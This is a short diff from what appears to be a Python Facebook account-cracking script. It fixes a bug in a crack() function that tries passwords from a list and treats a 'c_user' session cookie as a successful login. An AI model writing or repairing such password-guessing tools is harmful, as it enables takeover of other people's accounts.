@@ -167,7 +167,7 @@ def crack(uid, password_list, total_count):
             headers=headers,
             data=data,
             )
-            Session = Session.cookies.get_dict().keys()
+            response = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
